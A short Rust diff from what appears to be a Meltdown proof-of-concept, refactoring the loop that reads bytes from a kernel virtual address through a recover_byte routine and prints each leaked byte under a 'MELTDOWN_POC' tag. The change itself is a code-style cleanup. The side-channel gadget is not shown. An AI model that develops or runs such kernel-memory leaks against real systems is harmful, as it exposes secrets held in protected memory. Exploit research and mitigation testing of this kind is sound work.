@@ -346,14 +346,14 @@ fn run_leak(tries: u32, leak_len: usize, confidence: u32, smoke: bool) {
 
     let mut recovered = 0u32;
     let mut bytes = [0u8; LEAK_LEN];
-    for off in 0..leak_len {
+    for (off, slot) in bytes.iter_mut().take(leak_len).enumerate() {
         let addr = KERNEL_TARGET_VA + off;
         let (byte, hits) = recover_byte(addr as *const u8, tries);
         let confident = hits >= confidence;
         if confident {
             recovered += 1;
         }
-        bytes[off] = byte;
+        *slot = byte;
         write_str(STDOUT_FILENO, "MELTDOWN_POC:leak off=");
         write_u64(STDOUT_FILENO, off as u64);
         write_str(STDOUT_FILENO, " byte=0x");
